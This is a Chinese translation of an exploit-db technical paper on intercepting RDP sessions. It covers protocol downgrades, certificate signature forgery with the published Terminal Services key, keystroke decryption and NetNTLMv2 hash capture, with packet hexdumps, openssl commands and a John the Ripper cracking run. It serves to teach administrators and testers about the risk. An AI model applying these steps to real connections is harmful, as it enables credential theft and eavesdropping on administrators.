> 原文链接: https://www.anquanke.com//post/id/85761 


# 【技术分享】攻击RDP——如何窃听不安全的RDP连接


                                阅读量   
                                **240512**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：exploit-db.com
                                <br>原文地址：[https://www.exploit-db.com/docs/41621.pdf](https://www.exploit-db.com/docs/41621.pdf)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p5.ssl.qhimg.com/t015e9c7484c4fe172d.jpg)](https://p5.ssl.qhimg.com/t015e9c7484c4fe172d.jpg)**

****

翻译：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

稿费：300RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**简介 **

系统管理员每天都会使用远程桌面协议（RDP）登录到远程Windows计算机。最常见的情形是，人们使用它在关键服务器上执行某些管理任务，这些服务器包括具有高度特权帐户的域控制器等，它们的登陆凭据都是通过RDP传输的。因此，确保RDP配置的安全性是至关重要的。

但是根据我们的观察，由于配置错误，Active Directory环境中的系统管理员会定期显示（并忽略）证书警告，如下所示：

[![](https://p2.ssl.qhimg.com/t013148f080008c7314.png)](https://p2.ssl.qhimg.com/t013148f080008c7314.png)

图1：SSL证书警告

如果您的环境中经常遇到这样的警告的话，您将无法识别真正的中间人（MitM）攻击。

本文旨在帮您认识到认真对待证书警告以及如何安全地配置Windows环境有多么的重要。目标受众是系统管理员、渗透测试人员和安全爱好者。虽然对下列主题的了解没有硬性要求，但我仍然鼓励您进一步深入学习一下：

公钥密码术以及对称密码术（RSA和RC4）

SSL

x509证书

TCP

Python

十六进制数和二进制代码

我们将演示MitM是如何嗅探您的凭据的，如果您不小心的话是很容易中招的。这些都不是特别新的技术，例如Cain [2]就是用来干这个的。然而，Cain不仅“年代久远”，代码封闭，而且还只适用于Windows系统。我们想要分析RDP的所有细节和内部工作机制，并尽可能地模拟真实的攻击情形。

不用说，本文介绍的技术不得用于在未经授权的情况下访问不属于您的任何系统。它们只能在系统所有者完全同意的情况下用于教育目的。否则，你很可能违反法律，当然，具体还取决于你的管辖权。

对于心急的读者，可以通过参考资料[1]中的链接下载相应的源代码。

<br>

**协议分析**

让我们启动Wireshark，看看当我们通过RDP连接到服务器时会发生什么：

[![](https://p0.ssl.qhimg.com/t01e0fb1d9e8e78cb02.png)](https://p0.ssl.qhimg.com/t01e0fb1d9e8e78cb02.png)

图2：Wireshark中的RDP会话的开头部分内容

正如我们所看到的，客户端首先提出了用于RDP会话的安全协议。这里有三个协议：

标准RDP安全性协议

增强型RDP安全或TLS安全性协议

CredSSP协议

在本例中，客户端能够使用前两个协议。注意，标准的RDP安全性协议总是可用的，不需要由客户端指出。TLS或增强的RDP安全性协议，只是将标准RDP安全性协议封装到加密的TLS隧道内而已。顺便说一下，在本文中术语SSL和TLS可是可以互换的。

CredSSP协议虽然也使用TLS隧道，但它不是在受保护的隧道中传输密码，而是使用NTLM或Kerberos进行身份验证。该协议也称为网络级认证（NLA）。

早期的用户身份验证有一个特点，那就是允许服务器可以在用户提交任何凭据（用户名除外）之前拒绝访问，例如，如果用户没有必要的远程访问权限。

在上面的Wireshark会话中，我们可以看到，SSL握手是在客户端和服务器已同意使用增强的RDP安全性协议之后执行的。为此，我们右键单击磋商数据包后的第一个数据包，并将TCP数据流作为SSL解码：

[![](https://p3.ssl.qhimg.com/t016c592ae1cc2f8e57.png)](https://p3.ssl.qhimg.com/t016c592ae1cc2f8e57.png)

图3：SSL握手的开头部分内容

因此，如果我们想要对一个RDP连接进行中间人攻击的话，不能直接使用SSL代理，因为代理还需要知道RDP。它需要知道何时启动SSL握手，这类似于SMTP或FTP中的StartTLS。我们选择Python来实现这样的代理。为此，我们只需创建受害者客户端连接到的服务器套接字，以及连接到实际服务器的客户端套接字。我们在这些套接字之间转发数据，并在必要时将它们封装到SSL套接字中。当然，我们将密切关注相关数据并根据需要进行修改。

当然，首先要修改的就是客户端提出的协议。客户端可能想告诉服务器它可以执行CredSSP协议，但我们将在相应数据到达服务器的半路上将协议更改为标准RDP安全性协议。在默认配置中，服务器会很乐意使用这个协议的。

<br>

**利用Python打造用于RDP的MitM代理 **

我们的Python脚本的主循环大致如下所示： 

[![](https://p2.ssl.qhimg.com/t01cc3ea18a7c11bb7b.png)](https://p2.ssl.qhimg.com/t01cc3ea18a7c11bb7b.png)

函数run()打开套接字，处理协议的协商并启用SSL（如有必要）。

之后，数据就可以在两个套接字之间转发了。如果设置了调试标志，dump_data()函数会将数据作为hexdump打印到屏幕。而parse_rdp()会从数据中提取相应的信息，tamper_data()函数可用于对其进行修改。

<br>

**密码学基础知识 **

因为我们需要借助RSA来搞定标准RDP安全协议，所以我们先来了解一下RSA的基础知识。如果您熟悉这方面的知识的话，可以跳过此部分。

在RSA中，加密、解密和签名纯粹就是数学运算，并且都是针对整数的运算。

请记住，所有这些操作都是在有限群上完成的[3]。

当生成RSA密钥对时，您需要找到两个大质数p和q。你得到他们的乘积，n = pq（这称为模数），计算φ（n）=（p – 1）（q – 1）（欧拉常数函数），并选择一个与φ(n) 互质的整数e。然后，您需要找到满足

```
e•d≡1  modφ（n）
```

的数字d。

数字d就是私钥，而e和n则组成公钥。当然，理论上d可以利用n和e求出，但φ（n）却很难计算，除非你知道p和q。这就是为什么RSA的安全性在很大程度上取决于大数分解的难度。到目前为止，没有人知道如何有效地进行大数分解——除非你有一台可以工作的量子计算机[4,5]。

为了加密消息m，我们只需求其e次幂，然后模n：

```
c≡me mod n
```

为了对密文c进行解密，我们可以使用私钥指数d进行下列运算：

```
m≡cd mod n
```

实际上，这是加密运算的逆运算。当然，这里涉及许多数学知识，过于深入的内容我就不介绍了。

签名与解密相同。你只需在消息的哈希值上执行相同的运算即可。

如果m或c大于256位的话，这些运算的开销将非常大，所以通常只使用RSA来加密对称密钥。然后，通过使用刚生成的密钥通过对称密码（通常为AES）算法来加密实际的消息。

<br>

**攻陷标准RDP安全协议 **

其实，攻破这个协议难度并不太大，因为它的设计本身就存在很大隐患，下面我会具体加以讲解。

标准RDP安全协议的运行机制是：

客户声明打算使用标准RDP安全协议。

服务器同意并将自己的RSA公钥与“Server Random”一起发送到客户端。公钥以及其他信息（例如主机名等）的集合称为“证书”。

使用终端服务私钥对证书进行签名，以确保真实性。

客户端通过使用终端服务公钥验证证书。如果验证成功，它就使用服务器的公钥来加密“Client Random”，并将其发送给服务器。

服务器使用自己的私钥解密Client Random。

服务器和客户端从Server Random和Client Random中求出会话密钥[6]。这些密钥用于对会话的其余部分进行对称加密。

请注意，所有这些都是以纯文本形式发送的，而不是在SSL隧道内发送的。原则上讲这没有什么问题，微软只是试图实现自己的SSL加密技术。然而，加密技术是可没想象的那么容易[7]，按一般规律，你始终应该依靠已建立的解决方案，因为它们都是经过时间考验过得，而不是实现自己的解决方案。因此，微软在这里犯了一个根本性的错误——我实在想不通他们为什么要这样做。

你能发现这里的错误吗？客户端是如何获取终端服务公钥的？答案是：它是预装的。这意味着它在所有系统上使用相同的密钥。这意味着私钥也都是一样的！所以，它可以从任何Windows安装上面提取到。事实上，我们甚至不需要这样做，因为现在微软已经决定正式发布它，这样一来，我们可以直接从microsoft.com网站上找到它们[8]。

在导出会话密钥后，可以使用多个安全级别[9]进行对称加密：无、40位RC4、56位RC4、128位RC4或3DES（称为FIPS）。默认值为128位RC4（“High”）。但是如果我们能够窃听密钥的话，那么加密的强度就无所谓了。

所以我们的计划是很明显的：当发现服务器的公钥时，我们快速生成相同大小的自己的RSA密钥对，并用它覆盖原始密钥。当然，我们需要使用终端服务私钥生成我们的公钥的签名，并用它替换原始签名。然后，在客户端成功验证我们的假公钥之后，我们接收其Client Random。我们使用我们的私钥对它进行解密，将其写下来以便使用服务器的公钥重新加密它。仅此而已！这样一来，我们就可以被动地读取客户端和服务器之间的加密流量了。

唯一的挑战是正确解析RDP数据包。这才是我们感兴趣的： 



```
From server:
00000000: 03 00 02 15 02 F0 80 7F 66 82 02 09 0A 01 00 02 ........f.......
00000010: 01 00 30 1A 02 01 22 02 01 03 02 01 00 02 01 01 ..0...".........
00000020: 02 01 00 02 01 01 02 03 00 FF F8 02 01 02 04 82 ................
00000030: 01 E3 00 05 00 14 7C 00 01 2A 14 76 0A 01 01 00 ......|..*.v....
00000040: 01 C0 00 4D 63 44 6E 81 CC 01 0C 10 00 04 00 08 ...McDn.........
00000050: 00 00 00 00 00 01 00 00 00 03 0C 10 00 EB 03 04 ................
00000060: 00 EC 03 ED 03 EE 03 EF 03 02 0C AC 01 02 00 00 ................
00000070: 00 02 00 00 00 20 00 00 00 78 01 00 00 D9 5E A3 ..... ...x....^.
00000080: AA D6 F6 80 EB 0B 3E 1D 8D 30 B3 AB 6A AE 26 07 ......&gt;..0..j.&amp;.
00000090: EF 89 3D CB 15 98 AE 22 7E 4B 2B AF 07 01 00 00 ..=...."~K+.....
000000A0: 00 01 00 00 00 01 00 00 00 06 00 1C 01 52 53 41 .............RSA
000000B0: 31 08 01 00 00 00 08 00 00 FF 00 00 00 01 00 01 1...............
000000C0: 00 AF 92 E8 20 AC D5 F7 BB 9F CF 6F 6E 2C 63 07 .... ......on,c.
000000D0: 34 CC A7 7A 21 AB 29 8A 1B 5D FE FD 43 F1 10 FC 4..z!.)..]..C...
000000E0: DB C6 D6 4B F1 B7 E1 B9 5E F7 68 46 58 EF 09 39 ...K....^.hFX..9
000000F0: 08 03 0F 54 0C 58 FA 3E A3 4A 50 F6 91 E9 41 F8 ...T.X.&gt;.JP...A.
00000100: 89 1D CC 14 3C 64 0B 1D 2B 0C 98 DF 63 D6 A6 72 ....&lt;d..+...c..r
00000110: 42 ED AC CB 88 44 85 47 D3 89 45 BA BD 9F 2D D0 B....D.G..E...-.
00000120: D5 0E 24 09 AD 02 2B 9D 37 18 DD 12 8B F6 21 5B ..$...+.7.....![
00000130: 20 47 33 52 9C 00 32 BA E7 83 80 7F AA 3C F3 C7 G3R..2......&lt;..
00000140: 95 DD 84 C2 4E 5E 0C 27 52 74 FC 87 0E 10 D9 42 ....N^.'Rt.....B
00000150: 19 0D F5 77 57 3F 71 4F 9C 34 0F 12 F8 E8 B0 59 ...wW?qO.4.....Y
00000160: F7 CD 09 F9 A5 25 AE 6A CB E6 CB 88 24 DA D2 46 .....%.j....$..F
00000170: 42 21 21 94 2E 6D 42 FF 9F AF 89 E3 BA EC CC DA B!!..mB.........
00000180: 15 71 5D 17 A9 5A 00 59 D4 AD EA E4 93 58 06 5B .q]..Z.Y.....X.[
00000190: F7 22 2A 1F DD DC C6 27 30 2A 25 10 B1 A8 40 98 ."*....'0*%...@.
000001A0: 6B 24 B6 4E 2A 79 B7 40 27 F4 BE 07 35 80 50 48 k$.N*y.@'...5.PH
000001B0: 72 A4 0D 2B AA B0 5C 89 C0 96 2A 49 1E BC A1 AB r..+.....*I....
000001C0: D0 00 00 00 00 00 00 00 00 08 00 48 00 3D 5F 11 ...........H.=_.
000001D0: A1 C1 38 09 1B B1 85 52 1E D1 03 A1 1E 35 E7 49 ..8....R.....5.I
000001E0: CC 25 C3 3C 6B 98 77 C2 87 03 C4 F5 78 09 78 F1 .%.&lt;k.w.....x.x.
000001F0: 43 21 07 BD AB EE 8E B0 F6 BC FC B0 A6 6A DD 49 C!...........j.I
00000200: A0 F1 39 86 FE F1 1E 36 3C CE 69 C0 62 00 00 00 ..9....6&lt;.i.b...
00000210: 00 00 00 00 00 .....
```

我高亮显示了代表公钥的相关字节。在其前面的两个字节的内容是以小端字节顺序（0x011c）表示的公钥长度。正如我们之前讨论的那样，公钥由模数和公钥指数组成。有关此数据结构的详细信息，请阅读RDP的相关规范[10]。

让我们来看看我们感兴趣的信息。下面是模数： 



```
00000000: AF92 E820 ACD5 F7BB 9FCF 6F6E 2C63 0734 ... ......on,c.4
00000010: CCA7 7A21 AB29 8A1B 5DFE FD43 F110 FCDB ..z!.)..]..C....
00000020: C6D6 4BF1 B7E1 B95E F768 4658 EF09 3908 ..K....^.hFX..9.
00000030: 030F 540C 58FA 3EA3 4A50 F691 E941 F889 ..T.X.&gt;.JP...A..
00000040: 1DCC 143C 640B 1D2B 0C98 DF63 D6A6 7242 ...&lt;d..+...c..rB
00000050: EDAC CB88 4485 47D3 8945 BABD 9F2D D0D5 ....D.G..E...-..
00000060: 0E24 09AD 022B 9D37 18DD 128B F621 5B20 .$...+.7.....![
00000070: 4733 529C 0032 BAE7 8380 7FAA 3CF3 C795 G3R..2......&lt;...
00000080: DD84 C24E 5E0C 2752 74FC 870E 10D9 4219 ...N^.'Rt.....B.
00000090: 0DF5 7757 3F71 4F9C 340F 12F8 E8B0 59F7 ..wW?qO.4.....Y.
000000A0: CD09 F9A5 25AE 6ACB E6CB 8824 DAD2 4642 ....%.j....$..FB
000000B0: 2121 942E 6D42 FF9F AF89 E3BA ECCC DA15 !!..mB..........
000000C0: 715D 17A9 5A00 59D4 ADEA E493 5806 5BF7 q]..Z.Y.....X.[.
000000D0: 222A 1FDD DCC6 2730 2A25 10B1 A840 986B "*....'0*%...@.k
000000E0: 24B6 4E2A 79B7 4027 F4BE 0735 8050 4872 $.N*y.@'...5.PHr
000000F0: A40D 2BAA B05C 89C0 962A 491E BCA1 ABD0 ..+.....*I.....
00000100: 0000 0000 0000 0000 ........
```

签名是： 



```
00000000: 3D5F 11A1 C138 091B B185 521E D103 A11E =_...8....R.....
00000010: 35E7 49CC 25C3 3C6B 9877 C287 03C4 F578 5.I.%.&lt;k.w.....x
00000020: 0978 F143 2107 BDAB EE8E B0F6 BCFC B0A6 .x.C!...........
00000030: 6ADD 49A0 F139 86FE F11E 363C CE69 C062 j.I..9....6&lt;.i.b
00000040: 0000 0000 0000 0000 ........
```

Server Random是： 



```
00000000: D95E A3AA D6F6 80EB 0B3E 1D8D 30B3 AB6A .^.......&gt;..0..j
00000010: AE26 07EF 893D CB15 98AE 227E 4B2B AF07 .&amp;...=...."~K+..
```

这些都是以小端字节顺序排列的。我们要留心记下Server Random，并替换其他两个值。

为了生成我们的RSA密钥，我们将使用openssl。我知道有一个处理RSA的Python库，但它比openssl的速度要慢得多。



```
$ openssl genrsa 512 | openssl rsa -noout -text
Generating RSA private key, 512 bit long modulus
.....++++++++++++
..++++++++++++
e is 65537 (0x010001)
Private-Key: (512 bit)
modulus:
00:f8:4c:16:d5:6c:75:96:65:b3:42:83:ee:26:f7:
e6:8a:55:89:b0:61:6e:3e:ea:e0:d3:27:1c:bc:88:
81:48:29:d8:ff:39:18:d9:28:3d:29:e1:bf:5a:f1:
21:2a:9a:b8:b1:30:0f:4c:70:0a:d3:3c:e7:98:31:
64:b4:98:1f:d7
publicExponent: 65537 (0x10001)
privateExponent:
00:b0:c1:89:e7:b8:e4:24:82:95:90:1e:57:25:0a:
88:e5:a5:6a:f5:53:06:a6:67:92:50:fe:a0:e8:5d:
cc:9a:cf:38:9b:5f:ee:50:20:cf:10:0c:9b:e1:ee:
05:94:9a:16:e9:82:e2:55:48:69:1d:e8:dd:5b:c2:
8a:f6:47:38:c1
prime1:
[...]
```

这里我们可以看到模数n、公钥指数e和私钥指数d。它们是使用大端字节顺序的十六进制数字表示的。我们实际上需要一个2048位的密钥，而不是512位的，但道理您应该清楚了。

伪造签名很容易。我们取证书的前六个字段的MD5哈希值，根据规范添加一些常量[11]，然后用终端服务密钥[8]的私有部分进行加密。具体可以利用下列Python代码来完成： 

[![](https://p1.ssl.qhimg.com/t017791f8800ea7f554.png)](https://p1.ssl.qhimg.com/t017791f8800ea7f554.png)

我们需要拦截的下一个消息是包含加密的Client Random的消息。它看起来如下所示： 



```
From client:
00000000: 03 00 01 1F 02 F0 80 64 00 08 03 EB 70 81 10 01 .......d....p...
00000010: 02 00 00 08 01 00 00 DD 8A 43 35 DD 1A 12 99 44 .........C5....D
00000020: A1 3E F5 38 5C DB 3F 3F 40 D1 ED C4 A9 3B 60 6A .&gt;.8.??@....;`j
00000030: A6 10 5A AF FD 17 7A 21 43 69 D0 F8 9B F1 21 A3 ..Z...z!Ci....!.
00000040: F1 49 C6 80 96 03 62 BF 43 54 9D 38 4D 68 75 8C .I....b.CT.8Mhu.
00000050: EA A1 69 23 2F F6 E9 3B E7 E0 48 A1 B8 6B E2 D7 ..i#/..;..H..k..
00000060: E2 49 B1 B2 1B BF BA D9 65 0B 34 5A B0 10 73 6E .I......e.4Z..sn
00000070: 4F 15 FA D7 04 CA 5C E5 E2 87 87 ED 55 0F 00 45 O..........U..E
00000080: 65 2C C6 1A 4C 09 6F 27 44 54 FE B6 02 1C BA 9F e,..L.o'DT......
00000090: 3B D8 D0 8D A5 E6 93 45 0C 9B 68 36 5C 93 16 79 ;......E..h6..y
000000A0: 0B B8 19 BF 88 08 5D AC 19 85 7C BB AA 66 C4 D9 ......]...|..f..
000000B0: 8E C3 11 ED F3 8D 27 60 8A 08 E0 B1 20 1D 08 9A ......'`.... ...
000000C0: 97 44 6D 33 23 0E 5C 73 D4 02 4C 20 97 5C C9 F6 .Dm3#.s..L ...
000000D0: 6D 31 B2 70 35 39 37 A4 C2 52 62 C7 5A 69 54 44 m1.p597..Rb.ZiTD
000000E0: 4C 4A 75 D2 63 CC 52 15 8F 6E 2A D8 0D 61 A5 0A LJu.c.R..n*..a..
000000F0: 47 5B 2A 68 97 7B 1B FF D3 33 10 49 15 9A D6 2C G[*h.`{`...3.I...,
00000100: DF 04 6D 93 21 78 32 98 8B 0B F4 01 33 FB CC 5B ..m.!x2.....3..[
00000110: 83 BA 2D 7F EA 82 3B 00 00 00 00 00 00 00 00 ..-...;........
```

同样，这里也高亮显示了加密的Client Random，其中前面的四个字节表示其长度（0x0108）。

由于它是用我们的证书来加密的，那么自然可以轻松解密了： 



```
00000000: 4bbd f97d 49b6 8996 ec45 0ce0 36e3 d170 K..`}`I....E..6..p
00000010: 65a8 f962 f487 5f27 cd1f 294b 2630 74e4 e..b.._'..)K&amp;0t.
```

我们只需要使用服务器的公钥重新加密它，并在传递它之前进行相应的替换即可。

不幸的是，事情还没有结束。我们现在知道了秘密的Client Random，但不知道什么原因，微软并没有单纯用它作为对称密钥。有一个精心制作程序[6]可以导出客户端的加密密钥、服务器的加密密钥和签名密钥。

在导出会话密钥之后，我们可以初始化RC4流的s-box。由于RDP对于来自服务器的消息使用单独的密钥，而不是来自客户端的消息，因此我们需要两个s-box。s-box是一个256字节的数组，会根据密钥按照某种特定的方式进行重排。然后，s盒就会产生伪随机数流，用来与数据流进行异或处理。这个过程可以用下列Python代码完成： 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b9d91e8f9b3916fe.png)

正如你所看到的那样，协议要求密钥对4096个数据包加密后进行更新。但是这里我不打算实现这一点，因为我只是对凭证安全性的概念证明感兴趣，所以不想弄那么复杂。不过，如果读者学有余力的话，可以自行补上！

现在，我们已经万事俱备，足以读取所有的流量了。我们对含有键盘输入事件（即按键和按键释放）信息的数据包特别感兴趣。我从规范[12]了解到，消息可以包含多个数据包，并有慢路径包（从0x03开始）和快路径包（第一个字节可被四整除）。

键盘输入事件[13]由两个字节组成，例如： 

```
1 00000000: 01 1F ..
```

这意味着“S”键（0x1F）已被释放（因为第一个字节是0x01）。

当然，这里的解析工作处理的不是很到位，因为有时鼠标移动事件会被识别为键盘事件。此外，scancode需要转换为虚拟键代码，这取决于键盘类型和键盘布局。这样做好像有点复杂，所以我没有这样做，而是直接采用了参考资料[14]中的方法。对于概念验证来说，这已经足够好了。

让我们试验一下。连接到我们的虚假RDP服务器后，我们收到警告说无法验证服务器的真实性：

[![](https://p4.ssl.qhimg.com/t01b775845a1c6f3a60.png)](https://p4.ssl.qhimg.com/t01b775845a1c6f3a60.png)

图4：无法验证服务器的身份…

注意到了吗？这不是SSL的警告。但是无论如何，我们现在已经可以看到按键了（见图5）。

顺便说一下，这正是Cain所做的事情。

<br>

**攻陷增强型RDP安全协议 **

对我来说，降级到标准RDP安全协议是无法令人满意的。如果我是一个攻击者，我会尽量让攻击看起来不那么不显眼。在上面的情形中，受害人会注意到一个与平常不同的警告，并且在连接已经建立之后还必须输入其凭证。

当我使用Cain通过MitM方式攻击RDP连接时，要是没有看到相同的SSL警告的话，我会很不爽的。因为如果这个MitM工具会导致显示完全不同的警告的话，那么我就很难向客户解释为什么必须认真对待SSL警告，特别是当他们使用了未经验证的自签名证书的时候。

[![](https://p1.ssl.qhimg.com/t01e2742527fabee89c.png)](https://p1.ssl.qhimg.com/t01e2742527fabee89c.png)

图5：以明文显示的键盘输入事件。密码是Secr3t！

因此，让我们尝试将连接降级为增强型RDP安全协议。为此，我们需要自己的自签名SSL证书，不过这可以由openssl生成：



```
$ openssl req -new -newkey rsa：“$ KEYLENGTH”-days“$ DAYS”-nodes -x509 
-subj“$ SUBJ”-keyout privatekey.key -out certificate.crt 2&gt; / dev / null
```

我们需要在正确的时间将我们的Python TCP套接字封装到SSL套接字中，这对于我们来说不成问题。我之前说过，标准的RDP协议使用了SSL隧道，但服务器总是选择“None”作为其加密级别。这简直太好了，因为可以安全地假设SSL封装器能确保数据的真实性和完整性。在SSL之上使用RC4是没有必要的，因为这就是在资源浪费。提取击键的工作方式与前一节完全相同。

唯一多出来的安全功能就是服务器会对原始协议协商请求进行确认。

在建立SSL连接后，服务器会对客户端说：“顺便说一下，你告诉我这些是你能够处理的安全协议。”用二进制表示的话，它看起来像这样： 



```
From server:
00000000: 03 00 00 70 02 F0 80 7F 66 66 0A 01 00 02 01 00 ...p....ff......
00000010: 30 1A 02 01 22 02 01 03 02 01 00 02 01 01 02 01 0..."...........
00000020: 00 02 01 01 02 03 00 FF F8 02 01 02 04 42 00 05 .............B..
00000030: 00 14 7C 00 01 2A 14 76 0A 01 01 00 01 C0 00 4D ..|..*.v.......M
00000040: 63 44 6E 2C 01 0C 10 00 04 00 08 00 01 00 00 00 cDn,............
00000050: 01 00 00 00 03 0C 10 00 EB 03 04 00 EC 03 ED 03 ................
00000060: EE 03 EF 03 02 0C 0C 00 00 00 00 00 00 00 00 00 ................
```

然后，客户端可以将该值与最初在第一个请求中发送的值进行比较，如果不匹配，则终止连接。显然，这时已经太晚了。我们作为中间人，可以通过用其原始值（在这种情况下为0x03）替换相应字节（在偏移量为0x4C处的高亮显示字节）来隐藏来自客户端的伪协商请求。

之后，我们可以毫无阻碍的侦听一切流量了。好了，继续努力。

如预期的那样，受害者这里看到的是SSL警告。但这事仍然不够圆满。因为在建立RDP连接之前，没有提示我们输入凭据，而是直接显示了Windows登录屏幕。与NLA不同，认证是在会话内部进行的。同样，这仍然有别于典型的管理工作流程，很容易被精明的用户觉察到。

<br>

**突破CredSSP协议 **

好吧，我承认：这里我们没有直接攻陷CredSSP协议。但我们会找到一种方法来绕过它。

首先，让我们看看如果我们不降低连接的安全等级的话，会发生什么。这时，发送到服务器的相关消息如下所示： 



```
From client:
00000000: 30 82 02 85 A0 03 02 01 04 A1 82 01 DA 30 82 01 0............0..
00000010: D6 30 82 01 D2 A0 82 01 CE 04 82 01 CA 4E 54 4C .0...........NTL
00000020: 4D 53 53 50 00 03 00 00 00 18 00 18 00 74 00 00 MSSP.........t..
00000030: 00 2E 01 2E 01 8C 00 00 00 08 00 08 00 58 00 00 .............X..
00000040: 00 0A 00 0A 00 60 00 00 00 0A 00 0A 00 6A 00 00 .....`.......j..
00000050: 00 10 00 10 00 BA 01 00 00 35 82 88 E2 0A 00 39 .........5.....9
00000060: 38 00 00 00 0F 6D 49 C4 55 46 C0 67 E4 B4 5D 86 8....mI.UF.g..].
00000070: 8A FC 3B 59 94 52 00 44 00 31 00 34 00 55 00 73 ..;Y.R.D.1.4.U.s
00000080: 00 65 00 72 00 31 00 57 00 49 00 4E 00 31 00 30 .e.r.1.W.I.N.1.0
00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
000000A0: 00 00 00 00 00 00 00 00 00 11 0D 65 8E 92 7F 07 ...........e....
000000B0: 7B 04 02 04 0C C1 A6 B6 EF 01 01 00 00 00 00 00 `{`...............
000000C0: 00 D5 FD A8 7C EC 95 D2 01 A7 55 9D 44 F4 31 84 ....|.....U.D.1.
000000D0: 8A 00 00 00 00 02 00 08 00 52 00 44 00 31 00 34 .........R.D.1.4
000000E0: 00 01 00 08 00 44 00 43 00 30 00 31 00 04 00 14 .....D.C.0.1....
000000F0: 00 72 00 64 00 31 00 34 00 2E 00 6C 00 6F 00 63 .r.d.1.4...l.o.c
00000100: 00 61 00 6C 00 03 00 1E 00 64 00 63 00 30 00 31 .a.l.....d.c.0.1
00000110: 00 2E 00 72 00 64 00 31 00 34 00 2E 00 6C 00 6F ...r.d.1.4...l.o
00000120: 00 63 00 61 00 6C 00 05 00 14 00 72 00 64 00 31 .c.a.l.....r.d.1
00000130: 00 34 00 2E 00 6C 00 6F 00 63 00 61 00 6C 00 07 .4...l.o.c.a.l..
00000140: 00 08 00 D5 FD A8 7C EC 95 D2 01 06 00 04 00 02 ......|.........
00000150: 00 00 00 08 00 30 00 30 00 00 00 00 00 00 00 00 .....0.0........
00000160: 00 00 00 00 20 00 00 4C FA 6E 96 10 9B D9 0F 6A .... ..L.n.....j
00000170: 40 80 DA AA 8E 26 4E 4E BF AF FA E9 E3 68 AF 78 @....&amp;NN.....h.x
00000180: 7F 53 E3 89 D9 6B 18 0A 00 10 00 00 00 00 00 00 .S...k..........
00000190: 00 00 00 00 00 00 00 00 00 00 00 09 00 2C 00 54 .............,.T
000001A0: 00 45 00 52 00 4D 00 53 00 52 00 56 00 2F 00 31 .E.R.M.S.R.V./.1
000001B0: 00 39 00 32 00 2E 00 31 00 36 00 38 00 2E 00 34 .9.2...1.6.8...4
000001C0: 00 30 00 2E 00 31 00 37 00 39 00 00 00 00 00 00 .0...1.7.9......
000001D0: 00 00 00 00 00 00 00 19 0A F7 ED 0C 45 C0 80 73 ............E..s
000001E0: 53 74 1A AB AF 13 B4 A3 81 9F 04 81 9C 01 00 00 St..............
000001F0: 00 7F 38 FE A6 32 5E 4E 57 00 00 00 00 42 B4 6E ..8..2^NW....B.n
00000200: 39 09 AA CC 8F 04 71 5C 54 CF AD E0 A0 58 AA 06 9.....qT....X..
00000210: B2 F0 0A 33 05 03 54 60 FB E1 68 FC F5 0D A9 C0 ...3..T`..h.....
00000220: D9 57 BA 43 F2 92 F7 6F 32 74 4E 86 CD 7F F0 3B .W.C...o2tN....;
00000230: DD A4 A4 67 0A B7 7E 64 0B 63 D7 4B F7 C6 B7 8F ...g..~d.c.K....
00000240: 21 15 9D EA 3E E1 1A 50 AB AA D3 6E 46 9D 68 6E !...&gt;..P...nF.hn
00000250: 2A EA 44 5C E0 51 1D 41 B4 13 EB B9 90 E8 75 AD *.D.Q.A......u.
00000260: A0 99 4E F2 A5 99 D4 8D 2A 11 73 F1 95 FC 7E A0 ..N.....*.s...~.
00000270: 06 FD 13 DB D0 3B 7A B4 41 97 B6 94 D4 11 62 F5 .....;z.A.....b.
00000280: 4C 06 BE 03 9C 0F 55 0E 3C L.....U.&amp;lt;
```

我高亮显示了客户端质询和NTLM的应答，两者是彼此相邻的。服务器质询位于服务器的上一条消息中。

我们在这里看到的是NTLM身份验证[15]。这是一种质询-应答技术，其中客户端会将服务器质询（类似于Server Random）、客户端质询以及用户密码的哈希值以及一些其他值映射为加密哈希值。这个值称为“NTLM应答”，然后将其传输到服务器。

这个值的计算细节对我们来说并不重要。我们唯一需要知道的是，它不能用于重放攻击或用于哈希值传递攻击。但它可能会遭受密码猜测攻击！

底层的哈希算法是HMAC-MD5，这是一个相当差劲的哈希算法（所以我们可以每秒猜测大量值），但它仍然使用了salt（用来对付彩虹表）。

我们现在可以尝试用Hashcat [17]或者John Ripper [18]来破解它。John的哈希格式为[16]： 

```
&lt;Username&gt;::&lt;Domain&gt;:&lt;ServerChallenge&gt;:&lt;ClientChallenge&gt;:&lt;NTLMResponse&gt;
```

在本例中，我们有： 



```
User1::RD14:a5f46f6489dc654f:110d658e927f077b0402040cc1a6b6ef:0101000000000
000d5fda87cec95d201a7559d44f431848a0000000002000800520044003100340001000800
44004300300031000400140072006400310034002e006c006f00630061006c0003001e00640
06300300031002e0072006400310034002e006c006f00630061006c00050014007200640031
0034002e006c006f00630061006c0007000800d5fda87cec95d201060004000200000008003
000300000000000000000000000002000004cfa6e96109bd90f6a4080daaa8e264e4ebfaffa
e9e368af787f53e389d96b180a0010000000000000000000000000000000000009002c00540
0450052004d005300520056002f003100390032002e003100360038002e00340030002e0031
0037003900000000000000000000000000
```

如果我们把这个哈希值放在一个名为hashes.txt的文件中，那么可以通过下列命令来进行验证： 



```
$ echo 'S00perS3cretPa$$word' | ./john --format=netntlmv2 --stdin hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
S00perS3cretPa$$word (User1)
1g 0:00:00:00 33.33g/s 33.33p/s 33.33c/s 33.33C/s S00perS3cretPa$$word
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

虽然不是很理想，但是总比什么都没有强。不过，实际上我们可以做得更好。

